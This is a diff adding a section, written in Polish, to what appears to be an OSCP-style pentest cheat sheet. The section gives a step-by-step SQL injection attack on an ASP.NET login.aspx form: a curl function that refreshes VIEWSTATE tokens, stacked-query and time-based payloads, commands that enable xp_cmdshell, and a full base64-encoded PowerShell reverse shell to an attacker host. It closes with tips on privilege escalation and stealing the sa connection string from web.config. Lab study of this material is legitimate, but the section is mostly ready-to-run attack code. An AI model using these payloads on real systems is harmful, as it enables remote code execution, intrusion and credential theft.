@@ -406,6 +406,59 @@ EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
 ```
 
+### ASP.NET WebForms (`.aspx` login) SQLi → RCE — manualnie przez curl
+
+> Klasyk OSCP (np. challenge „Medtech"): formularz `login.aspx` z polami `...$UsernameTextBox`/`...$PasswordTextBox`. Dwie pułapki, przez które łatwo uznać, że „nie ma injekcji":
+> 1. **VIEWSTATE:** KAŻDY POST musi nieść świeże `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` pobrane GET-em tuż przed. Bez tego serwer zwraca **HTTP 500 (viewstate MAC)** — a wysłanie poprawnych tokenów i dostanie 200 to zarazem **dowód, że POST jest przetwarzany**.
+> 2. **Pusta tabela userów:** `OR 1=1` nie zaloguje i error-based przez `WHERE` milczy (brak wierszy do ewaluacji predykatu). Nie odpuszczaj — testuj **stacked queries** i **time-based**.
+
+**Krok 1 — funkcja pobierająca świeże tokeny i strzelająca payloadem (skopiuj do terminala):**
+```bash
+URL="http://$IP/login.aspx"
+inject(){
+  # 1) GET — wyciągnij świeże tokeny WebForms
+  page=$(curl -s "$URL")
+  vs=$(echo "$page"  | grep -oP 'id="__VIEWSTATE" value="\K[^"]+')
+  vg=$(echo "$page"  | grep -oP 'id="__VIEWSTATEGENERATOR" value="\K[^"]+')
+  ev=$(echo "$page"  | grep -oP 'id="__EVENTVALIDATION" value="\K[^"]+')
+  # 2) POST — wstrzyknij w pole username ($1), zmierz czas i rozmiar odpowiedzi
+  curl -s -o /tmp/resp.html -w "czas=%{time_total}s rozmiar=%{size_download}B kod=%{http_code}\n" "$URL" \
+    --data-urlencode "__VIEWSTATE=$vs" \
+    --data-urlencode "__VIEWSTATEGENERATOR=$vg" \
+    --data-urlencode "__EVENTVALIDATION=$ev" \
+    --data-urlencode 'ctl00$ContentPlaceHolder1$UsernameTextBox='"$1" \
+    --data-urlencode 'ctl00$ContentPlaceHolder1$PasswordTextBox=x' \
+    --data-urlencode 'ctl00$ContentPlaceHolder1$LoginButton=Login'
+}
+```
+
+**Krok 2 — potwierdź injekcję i silnik (error-based, `customErrors` zwykle OFF):**
+```bash
+inject "' OR 1=1#"        # '#' nie jest komentarzem w MSSQL -> pelny stack trace
+grep -i "SqlException\|Incorrect syntax\|Unclosed" /tmp/resp.html
+#   -> "System.Data.SqlClient.SqlException: Incorrect syntax near '#'" = MSSQL + webroot ze sciezki w bledzie
+```
+
+**Krok 3 — stacked queries (najkrótsza droga do RCE) + rola sysadmin:**
+```bash
+inject "';WAITFOR DELAY '0:0:5'-- -"                                   # czas ~5s = stacked dziala
+inject "';IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'-- -" # ~5s = jestesmy sysadmin
+```
+
+**Krok 4 — włącz `xp_cmdshell` i wykonaj komendę (każdy payload = osobny `inject`):**
+```bash
+inject "';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -"
+inject "';EXEC master..xp_cmdshell 'ping -n 4 <TWOJ_KALI>'-- -"        # potwierdz na: sudo tcpdump -i tun0 icmp
+```
+
+**Krok 5 — reverse shell (PowerShell, `-e` = base64 UTF-16LE; listener `nc -lvnp 443` PRZED):**
+```bash
+PSRS='$c=New-Object System.Net.Sockets.TCPClient("<TWOJ_KALI>",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
+B64=$(echo -n "$PSRS" | iconv -t UTF-16LE | base64 -w0)
+inject "';EXEC master..xp_cmdshell 'powershell -e $B64'-- -"
+```
+> Shell wraca zwykle jako `nt service\mssql$sqlexpress` → `whoami /priv` prawie zawsze ma **SeImpersonatePrivilege** → potato do SYSTEM (§4). Łup na start: `type C:\inetpub\wwwroot\web.config` (connection string `sa`) — reuse w domenie.
+
 ## 2.2 SQLMap (automatyzacja)
 
 ```bash
